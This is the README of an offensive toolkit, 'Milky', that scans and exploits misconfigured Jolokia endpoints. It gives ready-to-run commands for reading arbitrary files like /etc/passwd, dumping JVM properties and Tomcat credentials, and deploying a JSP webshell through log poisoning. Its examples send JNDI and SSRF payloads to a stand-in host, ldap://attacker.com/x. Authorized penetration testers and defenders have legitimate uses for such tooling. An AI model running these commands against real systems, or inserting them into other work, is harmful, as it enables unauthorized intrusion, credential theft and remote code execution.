# Milky

<img align="center" src="./img/milky.png">

Milky is a lightweight, single-file toolkit for identifying and exploiting misconfigured Jolokia endpoints. It covers version-based CVEs, dangerous MBean detection, and targeted exploitation — all with false-positive-aware probing.

## Installation

```bash
git clone https://github.com/UncleJ4ck/Milky
cd Milky
python3 -m venv venv && . venv/bin/activate
pip install -r requirements.txt
```

## Coverage

### CVEs
| CVE | Description | Detection |
|-----|-------------|-----------|
| CVE-2018-1000129 | Reflected XSS via `mimeType=text/html` | Live Content-Type probe (not version alone) |
| CVE-2018-1000130 | JNDI injection via JSR-160 proxy | Runtime proxy state check + live SSRF test |
| CVE-2022-41952 | Proxy allowlist bypass (1.7.1 / 2.0.0) | Version range + runtime state cross-check |

### Misconfigurations
| Finding | Severity | What it means |
|---------|----------|---------------|
| Unauthenticated access | HIGH | Jolokia responds without credentials |
| CORS wildcard | MEDIUM | `Access-Control-Allow-Origin: *` — enables JSONP theft from any origin |
| AccessLogValve writable | CRITICAL | RCE: attacker can write a JSP shell to the webroot via log-poisoning |
| DiagnosticCommand exposed | HIGH | Arbitrary file read + heap/thread dump |
| HotSpotDiagnostic exposed | MEDIUM | `dumpHeap` writes a full heap dump to any writable path |
| JMXConfigurator (Logback) | HIGH | `reloadByURL` may trigger JNDI lookups on vulnerable JDKs |
| UserDatabase exposed | HIGH/LOW | Tomcat MemoryRealm credentials readable; downgraded to LOW if no users configured |
| Proxy unrestricted | HIGH | Unauthenticated SSRF / JNDI via the JSR-160 proxy endpoint |

## Commands

```
milky.py <jolokia-url> <command> [options]
```

| Command | What it does |
|---------|-------------|
| `scan` | Full misconfiguration + CVE scan with live probes |
| `xss` | Probe CVE-2018-1000129 (path reflection + JSONP vector) |
| `proxy -u <url>` | Test proxy SSRF / CVE-2018-1000130 / CVE-2022-41952 |
| `jndi -u <url>` | Trigger `JMXConfigurator.reloadByURL` (Logback JNDI) |
| `dump` | Retrieve a JVM thread dump (DiagnosticCommand / Threading MBean) |
| `env` | Dump all JVM system properties (may include passwords) |
| `read -f <path>` | Read an arbitrary file via `DiagnosticCommand.compilerDirectivesAdd` |
| `creds` | Extract credentials from the Tomcat UserDatabase MBean |
| `deploy` | Write a JSP webshell via AccessLogValve log-poisoning |
| `spring -a get/set -k <key>` | Read or write Spring `EnvironmentManager` properties |

## Examples

```bash
# Full scan — discovers auth state, CVEs, dangerous MBeans
python3 milky.py http://target:8080/jolokia scan

# Probe XSS — distinguishes confirmed XSS from JSONP hijack
python3 milky.py http://target:8080/jolokia xss

# Test proxy SSRF (CVE-2018-1000130)
python3 milky.py http://target:8080/jolokia proxy -u 'service:jmx:rmi:///jndi/ldap://attacker.com/x'

# Trigger Logback JNDI via JMXConfigurator
python3 milky.py http://target:8080/jolokia jndi -u ldap://attacker.com/x

# Read /etc/passwd via DiagnosticCommand
python3 milky.py http://target:8080/jolokia read -f /etc/passwd

# Dump JVM properties (check for passwords in spring.datasource.password, etc.)
python3 milky.py http://target:8080/jolokia env

# Extract Tomcat UserDatabase credentials
python3 milky.py http://target:8080/jolokia creds

# Deploy a JSP webshell via AccessLogValve
python3 milky.py http://target:8080/jolokia deploy

# Authenticated scan
python3 milky.py http://target:8080/jolokia scan --user admin --password secret

# Debug mode (full HTTP traces)
python3 milky.py http://target:8080/jolokia scan --debug
```

## False-positive mitigations

- **CVE-2018-1000129**: version-based flag is suppressed unless a live `mimeType=text/html` probe actually changes the `Content-Type` response header.
- **CVE-2018-1000130**: suppressed when the Jolokia dispatcher has `Jsr160ProxyNotEnabledByDefaultAnymoreDispatcher` active (default since 1.5.0).
- **UserDatabase**: only MBeans with a `users` attribute in the JMX metadata are queried; resource-reference MBeans that return 404 are ignored.
- **XSS vs JSONP**: `xss` command distinguishes `text/html` reflection (XSS) from `text/javascript` JSONP callback reflection (hijack risk, not XSS).

## Credits

Thanks to [laluka](https://github.com/laluka/jolokia-exploitation-toolkit) for the original AccessLogValve technique.
